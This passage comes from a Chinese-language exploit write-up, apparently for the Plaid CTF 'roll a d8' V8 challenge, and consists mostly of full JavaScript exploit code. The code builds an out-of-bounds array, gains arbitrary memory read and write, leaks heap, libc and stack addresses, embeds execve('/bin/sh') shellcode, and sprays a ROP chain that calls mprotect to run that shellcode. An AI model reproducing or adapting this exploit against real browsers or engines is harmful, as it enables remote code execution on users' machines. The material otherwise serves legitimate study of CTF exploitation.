    let rop =  [
        pop_rdi,
        parseInt(shell_addr / 0x1000) * 0x1000, //shellcode的地址，需要对齐
        pop_rsi,
        4096,
        pop_rdx,
        7,
        mprotect,                               //调用mprotect修改内存权限
        shell_addr                              //返回地址为shellcode
    ];
构造好rop链之后，就要考虑如何劫持程序流程到rop链上了。
前文我们成功泄露出了栈地址，这里我们将采用一个技巧（和堆喷类似，我叫它栈喷2333）。
因为我们获得的栈地址几乎可以说是栈最高的地址，所以我们可以在栈上地址由高到低连续布置retn，这样一旦程序的某个返回地址被我们的retn覆盖，那么程序就会不断的retn下去。
只要我们在最高地址处布置上我们的rop链，那么程序在经过一段retn之后，就会来到我们的rop链上了。
代码如下：
    let retn = 0x000000000007EF0D + libc_base;
    let rop_start = stack_addr - 8 * (rop.length + 1);  //先将栈提高，以免修改到了环境变量
    for (let i = 0; i  (
        {
            counter : 0,
            next() {
                let result = 1.1;
                this.counter++;
                if (this.counter > maxSize) {
                    oobArray.length = 1;
                    for (let i = 0;i < 100;i++) {
                        bufs.push(new ArrayBuffer(0x1234));
                        let obj = {'a': 0x4321, 'b': 0x9999};
                        objs.push(obj);
                    }
                    return {done: true};
                } else {
                    return {value: result, done: false};
                }
            }
        }
    )});
    function test() {}  //没什么用，但是去掉后栈的位置会迷之提高（地址偏低），导致后面布置ROP失败
    for (let i = 0;i < 1000;i++) {
        test();
    }
    // 可控的buf在oobArray的第i个元素处
    let buf_offset = 0;
    for(let i = 0; i < maxSize; i++){
        let val = mem.d2u(oobArray[i]);
        if(val === 0x123400000000){
            console.log("buf_offset: " + i.toString());
            buf_offset = i;
            oobArray[i] = mem.u2d(0x121200000000);  //修改可控buf的size，做个标记
            oobArray[i + 3] = mem.u2d(0x1212);
            break;
        }
    }
    // 可控的obj在oobArray的第i个元素处
    let obj_offset = 0
    for(let i = 0; i < maxSize; i++){
        let val = mem.d2u(oobArray[i]);
        if(val === 0x432100000000){
            console.log("obj_offset: " + i.toString());
            obj_offset = i;
            oobArray[i] = mem.u2d(0x567800000000); //修改可控obj的属性a，做个标记
            break;
        }
    }
    // bufs中的第i个buf是可控的
    let controllable_buf_idx = 0;
    for(let i = 0; i < bufs.length; i++){
        let val = bufs[i].byteLength;
        if(val === 0x1212){
            console.log("found controllable buf at idx " + i.toString());
            controllable_buf_idx = i;
            break;
        }
    }
    // objs中第i个obj是可控的
    let controllable_obj_idx = 0;
    for(let i = 0; i < objs.length; i++){
        let val = objs[i].a;
        if(val === 0x5678){
            console.log("found controllable obj at idx " + i.toString());
            controllable_obj_idx = i;
            break;
        }
    }
    var heap_addr = mem.d2u(oobArray[buf_offset + 1]) - 0x10
    console.log("heap_addr: 0x" + heap_addr.toString(16));
    class arbitraryRW{
        constructor(buf_offset, buf_idx, obj_offset, obj_idx){
            this.buf_offset = buf_offset;
            this.buf_idx = buf_idx;
            this.obj_offset = obj_offset;
            this.obj_idx = obj_idx;
        }
        leak_obj(obj){
            objs[this.obj_idx].a = obj;
            return mem.d2u(oobArray[this.obj_offset]) - 1;
        }
        read(addr){
            let idx = this.buf_offset;
            oobArray[idx + 1] = mem.u2d(addr);
            oobArray[idx + 2] = mem.u2d(addr);
            let tmp = new Float64Array(bufs[this.buf_idx], 0, 0x10);
            return mem.d2u(tmp[0]);
        }
        write(addr, val){
            let idx = this.buf_offset;
            oobArray[idx + 1] = mem.u2d(addr);
            oobArray[idx + 2] = mem.u2d(addr);
            let tmp = new Float64Array(bufs[this.buf_idx], 0, 0x10);
            tmp.set([mem.u2d(val)]);
        }
    }
    var arw = new arbitraryRW(buf_offset, controllable_buf_idx, obj_offset, controllable_obj_idx);
    let curr_chunk = heap_addr;
    let searched = 0;
    for(let i = 0; i < 0x5000; i++){
        let size = arw.read(curr_chunk + 0x8);
        let prev_size = arw.read(curr_chunk);
        if(size !== 0 && size % 2 === 0 && prev_size <= 0x3f0){
            let tmp_ptr = curr_chunk - prev_size;
            let fd = arw.read(tmp_ptr + 0x10);
            let bk = arw.read(tmp_ptr + 0x18)
            if(parseInt(fd / 0x10000000000) === 0x7f){
                searched = fd;
                break;
            }else if(parseInt(bk / 0x10000000000) === 0x7f){
                searched = bk;
                break;
            }
        } else if(size < 0x20) {
            break;
        }
        size = parseInt(size / 8) * 8
        curr_chunk += size;
    }
    if(searched !== 0){
        var libc_base = parseInt((searched - 0x3c4000) / 0x1000) * 0x1000;
        console.log("searched libc_base: 0x" + libc_base.toString(16));
    } else {
        console.log("Not found")
    }
    /*
    //修改malloc_hook实现getshell
    malloc_hook = 0x3c4b10 + libc_base;
    one_gadet = 0x4526a + libc_base;
    arw.write(malloc_hook, [mem.u2d(one_gadet)]);
    */
    let environ_addr = libc_base + 0x3C6F38;
    let stack_addr = arw.read(environ_addr);
    console.log("stack_addr: 0x" + stack_addr.toString(16));
    let sc = [0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05];
    let shellcode = new Uint8Array(2048);
    for(let i = 0; i < sc.length; i++){
        shellcode[i] = sc[i];
    }
    let shell_addr = arw.read(arw.leak_obj(shellcode) + 0x68);
    console.log("shell_addr: 0x" + shell_addr.toString(16));
    let retn = 0x000000000007EF0D + libc_base;
    let pop_rdi = 0x0000000000021102 + libc_base;
    let pop_rsi = 0x00000000000202e8 + libc_base;
    let pop_rdx = 0x0000000000001b92 + libc_base;
    let mprotect = 0x0000000000101770 +libc_base;
    let rop =  [
        pop_rdi,
        parseInt(shell_addr / 0x1000) * 0x1000,
        pop_rsi,
        4096,
        pop_rdx,
        7,
        mprotect,
        shell_addr
    ];
    let rop_start = stack_addr - 8 * (rop.length + 1);
    for (let i = 0; i < rop.length; i++) {
        arw.write(rop_start + 8 * i, rop[i]);
    }
    for (let i = 0; i < 0x100; i++) {
        rop_start -= 8;
        arw.write(rop_start, retn);
    }
    print("done");
# 总结
虽然写完了exp，但是还是有一个玄学问题没有解决，在exp中必须要添加一个没什么用的函数并jit优化它，然后才能成功getshell。如果将它去掉，那么在最后"栈喷"的时候，程序的rsp距离我们泄露的栈地址贼远，没办法喷过去2333，调了很久也没弄清楚原因，希望有大佬知道的话能够告知一下。  
（萌新刚入门，文章如果有错误请师傅们谅解，如果发现我一定更正。
# 参考资料
## v8基础
  * [sakura师傅的《v8 exploit》](http://eternalsakura13.com/2018/05/06/v8/)
  * [V8 Object 内存结构与属性访问详解](https://zhuanlan.zhihu.com/p/24982678)
  * [[译] JavaScript 引擎基础：Shapes 和 Inline Caches](https://hijiangtao.github.io/2018/06/17/Shapes-ICs/)
  * [A tour of V8: object representation](http://www.jayconrod.com/posts/52/a-tour-of-v8-object-representation)
  * [Fast properties in V8](https://v8.dev/blog/fast-properties)  
## v8利用
  * [Google CTF justintime exploit](http://eternalsakura13.com/2018/11/19/justintime/)
  * [扔个骰子学v8 - 从Plaid CTF roll a d8开始](https://www.anquanke.com/post/id/147829#h3-3)
  * [aSiagaming-PCTF 2018 Roll a d8](https://github.com/Hpasserby/aSiagaming/tree/master/Chrome-v8-PCTF-roll-a-d8)